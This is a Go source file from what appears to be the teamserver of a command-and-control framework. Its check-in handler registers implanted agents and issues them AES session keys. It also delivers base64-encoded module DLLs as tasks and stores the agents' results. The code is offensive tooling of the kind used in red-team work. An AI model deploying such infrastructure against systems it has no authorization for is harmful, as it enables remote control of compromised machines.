package services

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/ksel172/Meduza/teamserver/internal/storage/dal"
	"github.com/ksel172/Meduza/teamserver/models"
	"github.com/ksel172/Meduza/teamserver/pkg/conf"
	"github.com/ksel172/Meduza/teamserver/pkg/logger"
	"github.com/ksel172/Meduza/teamserver/utils"
)

// Simple temporary key registry to store keys in server memory
type keyRegistry struct {
	mu       sync.Mutex
	registry map[string][]byte
}

func (k *keyRegistry) writeKey(agentID string, key []byte) {
	k.mu.Lock()
	defer k.mu.Unlock()
	k.registry[agentID] = key
}

var (
	KeyRegistry = keyRegistry{
		mu:       sync.Mutex{},
		registry: make(map[string][]byte),
	}
	LogLevel  = "[Handler] "
	LogDetail = "[CheckIn] "
)

type ICheckInController interface {
	Checkin(ctx *gin.Context)
}

type CheckInController struct {
	checkInDAL dal.ICheckInDAL
	agentDAL   dal.IAgentDAL
}

func NewCheckInController(checkInDAL dal.ICheckInDAL, agentDAL dal.IAgentDAL) *CheckInController {
	return &CheckInController{checkInDAL: checkInDAL, agentDAL: agentDAL}
}

func (cc *CheckInController) Checkin(ctx *gin.Context) {

	req, exists := ctx.Get("c2request")
	if !exists {
		logger.Error(LogLevel, LogDetail, "c2request not set by previous handler")
		ctx.Status(http.StatusInternalServerError)
		return
	}

	c2request, ok := req.(models.C2Request)
	if !ok {
		logger.Error(LogLevel, LogDetail, "c2request is not of C2Request type")
		ctx.Status(http.StatusInternalServerError)
		return
	}

	// Verify if the agent has sent authentication token (done in the previous handler)
	// if yes, server will have to provide the client with the key
	if _, ok := ctx.Get(AuthToken); ok {
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling encryption key request for agent %s", c2request.AgentID))
		cc.handleEncryptionKeyRequest(ctx, c2request)
		return
	}

	if c2request.Reason == models.Task {
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling task request for agent %s", c2request.AgentID))
		cc.handleTaskRequest(ctx, c2request)

	} else if c2request.Reason == models.Response {
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling response request for agent %s", c2request.AgentID))
		cc.handleResponseRequest(ctx, c2request)
		return
	} else if c2request.Reason == models.Register {
		logger.Info(LogLevel, LogDetail, fmt.Sprintf("Handling register request for agent %s", c2request.AgentID))
		cc.handleRegisterRequest(ctx, c2request)
		return
	}
}

func (cc *CheckInController) handleEncryptionKeyRequest(ctx *gin.Context, c2request models.C2Request) {
	// Generate an AES key for this session to communicate with the agent
	key, err := utils.GenerateAES256Key()
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to generate AES256 key: %v", err))
		ctx.Status(http.StatusInternalServerError)
		return
	}

	// Store the key in the registry
	KeyRegistry.writeKey(c2request.AgentID, key)

	ctx.JSON(http.StatusOK, gin.H{"key": key})
}

func (cc *CheckInController) handleTaskRequest(ctx *gin.Context, c2request models.C2Request) {
	tasks, err := cc.agentDAL.GetAgentTasks(ctx, c2request.AgentID)
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to get tasks for agent %s: %v", c2request.AgentID, err))
		ctx.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
		return
	}

	for i, task := range tasks {
		moduleDirPath := filepath.Join(conf.GetModuleUploadPath(), task.Module)
		moduleName := task.Command.Name

		modulePath := filepath.Join(moduleDirPath, moduleName)
		mainModuleBytes, err := utils.LoadAssembly(filepath.Join(modulePath, moduleName+".dll"))
		if err != nil {
			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load main module: %v", err))
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load main module: %s", err.Error())})
			return
		}

		loadingModulePath := moduleDirPath + "/" + moduleName + "/"
		dependencyBytes := make(map[string][]byte)
		files, err := os.ReadDir(loadingModulePath)
		if err != nil {
			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to read module directory: %v", err))
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to read module directory: %s", err.Error())})
			return
		}

		for _, file := range files {
			if file.Name() != moduleName+".dll" && strings.HasSuffix(file.Name(), ".dll") {
				depBytes, err := utils.LoadAssembly(filepath.Join(loadingModulePath, file.Name()))
				if err != nil {
					logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to load dependency: %v", err))
					ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to load dependency: %s", err.Error())})
					return
				}
				dependencyBytes[file.Name()] = depBytes
			}
		}

		moduleBytes := models.ModuleBytes{
			ModuleBytes:     mainModuleBytes,
			DependencyBytes: dependencyBytes,
		}

		moduleBytesJSON, err := json.Marshal(moduleBytes)
		if err != nil {
			logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal module bytes: %v", err))
			ctx.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("failed to marshal module bytes: %s", err.Error())})
			return
		}

		task.Module = base64.StdEncoding.EncodeToString(moduleBytesJSON)
		tasks[i] = task
	}

	// Update the agent's last callback time
	lastCallback := time.Now().Format(time.RFC3339)
	if err := cc.agentDAL.UpdateAgentLastCallback(ctx.Request.Context(), c2request.AgentID, lastCallback); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to update agent last callback: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	tasksJSON, err := json.Marshal(tasks)
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to marshal tasks to JSON: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": "failed to marshal tasks to JSON"})
		return
	}

	var c2response models.C2Request
	c2response.AgentID = c2request.AgentID
	c2response.Reason = models.Task
	c2response.Message = string(tasksJSON)
	ctx.JSON(http.StatusOK, c2response)
}

func (cc *CheckInController) handleResponseRequest(ctx *gin.Context, c2request models.C2Request) {
	var agentTask models.AgentTask
	if err := json.Unmarshal([]byte(c2request.Message), &agentTask); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to unmarshal agent message: %v", err))
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent info"})
		return
	}

	err := cc.agentDAL.UpdateAgentTask(ctx.Request.Context(), agentTask)
	if err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to update agent task: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	logger.Info(LogLevel, LogDetail, fmt.Sprintf("Successfully updated agent task: %s", agentTask.TaskID))
	ctx.JSON(http.StatusOK, "successfully updated")
}

func (cc *CheckInController) handleRegisterRequest(ctx *gin.Context, c2request models.C2Request) {
	logger.Info(LogLevel, LogDetail, fmt.Sprintf("Received check-in request from agent: %s", c2request.AgentID))

	var agentInfo models.AgentInfo
	if err := json.Unmarshal([]byte(c2request.Message), &agentInfo); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to parse agent info from message: %v", err))
		ctx.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent info"})
		return
	}

	if _, err := cc.agentDAL.GetAgent(agentInfo.AgentID); err == nil {
		logger.Info(LogLevel, LogDetail, "Agent already exists:", c2request.AgentID)
		ctx.JSON(http.StatusConflict, gin.H{"error": "agent already exists"})
		return
	}

	newAgent := c2request.IntoNewAgent()
	newAgent.Name = utils.RandomString(6)

	if err := cc.checkInDAL.CreateAgent(ctx.Request.Context(), newAgent); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to create agent: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if err := cc.agentDAL.CreateAgentInfo(ctx.Request.Context(), agentInfo); err != nil {
		logger.Error(LogLevel, LogDetail, fmt.Sprintf("Failed to create agent info: %v", err))
		ctx.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	ctx.JSON(http.StatusCreated, gin.H{"agent": newAgent})
}
